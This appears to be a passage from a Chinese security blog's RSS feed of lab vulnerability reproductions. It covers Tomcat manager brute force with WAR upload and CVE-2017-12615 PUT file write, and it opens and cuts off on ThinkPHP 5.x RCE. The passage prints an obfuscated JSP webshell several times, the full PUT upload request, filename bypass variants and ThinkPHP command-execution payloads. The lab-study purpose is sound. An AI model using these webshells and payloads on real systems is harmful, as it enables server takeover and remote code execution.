&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span>&lt;span class="o">+-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">L&lt;/span> &lt;span class="n">s&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Tomacat漏洞复现】后台弱口令+文件上传</title><link>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid><description>&lt;img src="http://localhost:1313/images/35.webp" alt="Featured image of post 【Tomacat漏洞复现】后台弱口令+文件上传" />&lt;h1 id="影响范围">影响范围&lt;/h1>
&lt;p>Tomcat8&lt;/p>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>这边就还是用vulhub进行复现&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/tomcat/tomcat8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>这里使用MSF进行复现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png" alt="image.png">&lt;br>
&lt;strong>查找与 tomcat 相关的模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">search tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>使用 auxiliary/scanner/http/tomcat_mgr_login 模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/http/tomcat_mgr_login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>查看需要填写哪些参数&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>将 rhosts 设置为目标机&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">set rhosts 172.16.2.174
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>进行爆破&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png" alt="image.png">&lt;br>
这里成功爆破出账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>点击 Manager App 进行登录&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png" alt="image.png">&lt;br>
&lt;strong>登录后找到上传点&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png" alt="image.png">&lt;br>
将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war&lt;br>
jsp 一句话木马，密码为123&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>上传111.war文件&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png" alt="image.png">&lt;br>
访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png" alt="image.png">&lt;/p>
&lt;p>&lt;strong>上蚁剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/11/11.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：pass
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png" alt="image.png">&lt;/p></description></item><item><title>【Tomcat漏洞复现】CVE-2017-12615任意文件写入</title><link>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</guid><description>&lt;img src="http://localhost:1313/images/34.webp" alt="Featured image of post 【Tomcat漏洞复现】CVE-2017-12615任意文件写入" />&lt;h1 id="漏洞详情">漏洞详情&lt;/h1>
&lt;p>当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 &lt;code>readonly&lt;/code> 参数设置为 &lt;code>false&lt;/code>）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。&lt;br>
&lt;strong>关键点：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>触发条件&lt;/strong>：需手动修改 &lt;code>conf/web.xml&lt;/code> 文件中的 &lt;code>readonly&lt;/code> 参数为 &lt;code>false&lt;/code>（默认值为 &lt;code>true&lt;/code>，PUT/DELETE 方法被禁用）。&lt;/li>
&lt;li>&lt;strong>绕过限制&lt;/strong>：Tomcat 默认通过 &lt;code>JspServlet&lt;/code> 处理 &lt;code>.jsp&lt;/code> 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 &lt;code>DefaultServlet&lt;/code> 处理：
&lt;ul>
&lt;li>文件名后添加空格（&lt;code>evil.jsp%20&lt;/code>，利用 Windows 不允许文件名以空格结尾的特性）。&lt;/li>
&lt;li>使用 NTFS 文件流特性（&lt;code>evil.jsp::$DATA&lt;/code>）。&lt;/li>
&lt;li>文件名后添加斜杠（&lt;code>evil.jsp/&lt;/code>，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。&lt;br>
&lt;strong>影响范围：&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>受影响的 Tomcat 版本&lt;/strong>：
&lt;ul>
&lt;li>Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。&lt;/li>
&lt;li>部分测试显示 Tomcat 8.5.19 等版本也可能受影响。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>操作系统&lt;/strong>：主要针对 Windows，但通过添加斜杠的绕过方式（&lt;code>evil.jsp/&lt;/code>）可扩展至 Linux 系统。&lt;br>
&lt;strong>攻击思路：&lt;/strong>&lt;br>
​ 上传木马文件，webshell管理工具进行连接&lt;/li>
&lt;/ul>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用vulhub进行搭建：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub/tomcat/CVE-2017-12615
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133115.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>&lt;strong>burpsuite抓包&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133228.png" alt="image.png">&lt;br>
使用&lt;code>webshell generate&lt;/code>快速生成木马，项目地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/cseroad/Webshell_Generate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133326.png" alt="image.png">&lt;br>
一句话木马：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将生成的木马上传。这里使用&lt;strong>PUT&lt;/strong>方法进行上传，文件名可以是&lt;code>/xxx.jsp/&lt;/code>、&lt;code>/xxx.jsp%20&lt;/code>、&lt;code>/xxx::$DATA&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">PUT /123.jsp/ HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 192.168.197.140:8080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate, br
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Priority: u=0, i
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 946
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133512.png" alt="image.png">&lt;br>
返回&lt;strong>201&lt;/strong>即上传成功，使用蚁剑进行连接&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/123.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133602.png" alt="image.png">&lt;/p>
&lt;h1 id="绕过姿势">绕过姿势&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1.Windows下不允许文件以空格结尾以
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2.WindowsNTFS流
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp::$DATA HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. /在文件名中是非法的， 也会被去除（Linux/Windows）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp/http:/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="修复建议">修复建议&lt;/h1>
&lt;p>把readonly 改成true&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;init-param&amp;gt; &amp;lt;param-name&amp;gt;readonly&amp;lt;/param-name&amp;gt; &amp;lt;paramvalue&amp;gt;true&amp;lt;/param-value&amp;gt;&amp;lt;/init-param&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 03 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/30.webp" alt="Featured image of post 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞" />&lt;h1 id="0x00-简介">0x00 简介&lt;/h1>
&lt;p>ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。&lt;/p>
&lt;h1 id="0x01-漏洞概述">0x01 漏洞概述&lt;/h1>
&lt;p>ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。&lt;/p>
&lt;h1 id="0x02-影响版本">0x02 影响版本&lt;/h1>
&lt;p>thinkphp 5.0.x&lt;br>
thinkphp 5.1.x&lt;/p>
&lt;h1 id="0x03-环境搭建">0x03 环境搭建&lt;/h1>
&lt;h2 id="1-在docker容器里搭建环境">1、 在docker容器里搭建环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/thinkphp/5-rce/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-进入目录下-启动环境">2、 进入目录下， 启动环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="3-查看环境端口">3、 查看环境端口&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker ps -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里我使用的是我自己的Ubuntu系统搭建的。&lt;br>
